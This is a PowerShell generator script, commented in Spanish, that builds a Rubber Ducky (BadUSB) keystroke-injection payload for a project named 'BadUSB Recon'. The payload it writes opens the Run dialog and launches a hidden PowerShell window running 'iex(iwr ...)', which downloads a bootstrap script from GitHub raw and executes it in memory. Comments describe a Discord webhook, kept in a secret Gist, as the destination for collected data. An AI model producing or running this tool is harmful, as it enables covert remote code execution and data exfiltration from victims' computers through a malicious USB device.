# ============================================================
# BadUSB Recon - Generador de Ducky Script (metodo download)
# ------------------------------------------------------------
# Descarga el payload desde GitHub raw y le inyecta el webhook
# en memoria antes de ejecutarlo. NO codifica a Base64.
#
# Uso:
#   .\generate_ducky.ps1
#   .\generate_ducky.ps1 -Webhook "https://discord.com/..."
#   .\generate_ducky.ps1 -PayloadUrl "https://raw.githubusercontent.com/..."
# ============================================================

param(
    [string]$Webhook,
    [string]$PayloadUrl = "https://raw.githubusercontent.com/AndYLndR/badusb-recon/main/payloads/payload.ps1",
    [string]$OutputPath
)

$ErrorActionPreference = "Stop"

$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$repoRoot  = Split-Path -Parent $scriptDir

if (-not $OutputPath) {
    $OutputPath = Join-Path $repoRoot "payload_ducky.txt"
}

# --- 1. Obtener webhook (igual que antes) ---
if (-not $Webhook) {
    $configPath = Join-Path $repoRoot "config.local.ps1"
    if (Test-Path $configPath) {
        . $configPath
        if ($Config.Webhook -and $Config.Webhook -notlike "*XXX*" -and $Config.Webhook -notlike "*PLACEHOLDER*") {
            $Webhook = $Config.Webhook
            Write-Host "[+] Webhook cargado desde config.local.ps1" -ForegroundColor Green
        }
    }
}

if (-not $Webhook) {
    Write-Host ""
    Write-Host "Pega tu webhook de Discord (o deja vacio para cancelar):" -ForegroundColor Yellow
    $Webhook = Read-Host "Webhook"
}

if (-not $Webhook -or $Webhook -notmatch "^https?://") {
    Write-Host "[-] Webhook no valido. Abortando." -ForegroundColor Red
    exit 1
}

# --- 2. URL del bootstrap ---
$BootstrapUrl = "https://raw.githubusercontent.com/AndYLndR/badusb-recon/main/payloads/bootstrap.ps1"

# --- 3. Generar el Ducky Script ---
$ducky = @"
REM ============================================================
REM BadUSB Recon Lab - Ducky Script generado automaticamente
REM Fecha: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
REM Metodo: bootstrap (descarga + ejecucion en memoria)
REM ============================================================

DELAY 1000
GUI r
DELAY 800
STRING powershell -WindowStyle Hidden -c "iex(iwr '$BootstrapUrl' -UseBasicParsing).Content"
ENTER
"@

[IO.File]::WriteAllText($OutputPath, $ducky)

# --- 4. Resumen ---
Write-Host ""
Write-Host "=== RESUMEN ===" -ForegroundColor Yellow
Write-Host "  Metodo       : bootstrap + ejecucion en memoria"
Write-Host "  Bootstrap    : $BootstrapUrl"
Write-Host "  Ducky Script : $OutputPath"
Write-Host "  Longitud     : $($ducky.Length) caracteres"
Write-Host ""
Write-Host "  Recuerda:" -ForegroundColor Yellow
Write-Host "   - El webhook ahora vive en el Gist secreto, NO en el Ducky."
Write-Host "   - Actualiza \$ConfigUrl en bootstrap.ps1 si cambias de Gist."
Write-Host "   - El payload.ps1 debe estar accesible en GitHub raw."
